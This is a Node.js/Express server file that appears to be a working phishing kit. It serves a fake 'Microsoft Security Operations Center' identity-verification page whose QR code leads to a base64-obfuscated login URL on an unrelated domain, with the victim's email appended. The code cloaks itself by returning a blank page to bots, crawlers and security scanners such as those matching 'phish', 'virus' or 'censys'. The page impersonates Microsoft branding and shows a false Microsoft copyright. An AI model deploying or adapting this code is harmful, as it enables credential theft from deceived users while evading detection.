const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.all('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || req.query.login_hint || req.body?.login_hint || "";
    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);

    if (isBotUA || (targetEmail === "" && !req.query.debug)) {
        return res.send('<html><body style="background:white;"></body></html>');
    }

    // Le lien final qui sera dans le QR Code
    let finalLink = Buffer.from(part1, 'base64').toString() + Buffer.from(part2, 'base64').toString();
    if(targetEmail !== "") finalLink += (finalLink.includes('?') ? '&' : '?') + "m=" + encodeURIComponent(targetEmail);

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Identity Verification</title>
            <style>
                body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
                .card { background: white; width: 100%; max-width: 450px; padding: 40px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-radius: 2px; }
                .logo-section { display: flex; align-items: center; margin-bottom: 20px; }
                .logo-icon { width: 24px; margin-right: 10px; }
                .soc-text { font-size: 16px; color: #333; font-weight: 500; }
                .badge { background: #fff8e1; color: #fbc02d; font-size: 10px; font-weight: bold; padding: 4px 8px; border-radius: 2px; display: inline-block; margin-bottom: 20px; text-transform: uppercase; }
                h2 { font-size: 24px; color: #222; margin: 0 0 15px 0; font-weight: 400; }
                p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 30px; }
                .qr-container { background: #f8fbff; border: 1px solid #e1e8f0; padding: 30px; text-align: center; position: relative; }
                .sync-text { color: #0078d4; font-size: 13px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; }
                .dot { height: 8px; width: 8px; background-color: #0078d4; border-radius: 50%; display: inline-block; margin-right: 10px; animation: blink 1s infinite; }
                @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
                .qr-code { width: 180px; height: 180px; background: white; margin: 0 auto; display: block; border: 1px solid #eee; }
                .footer { margin-top: 40px; font-size: 11px; color: #999; border-top: 1px solid #eee; padding-top: 20px; line-height: 1.6; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo-section">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Microsoft_Azure_Shield.svg" class="logo-icon">
                    <span class="soc-text">Security Operations Center</span>
                </div>
                <div class="badge">Action Required</div>
                <h2>Identity Verification</h2>
                <p>For your protection, this verification must be completed via a mobile device. Please scan the secure QR code below to verify and restore full account access.</p>
                
                <div class="qr-container">
                    <div class="sync-text"><span class="dot"></span> Waiting for mobile synchronization...</div>
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(finalLink)}" class="qr-code">
                </div>

                <div class="footer">
                    Case ID: #IT-483921 | Status: Pending<br>
                    Timestamp: ${new Date().toLocaleString()}<br><br>
                    © 2026 Microsoft Corporation. IT Security.
                </div>
            </div>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
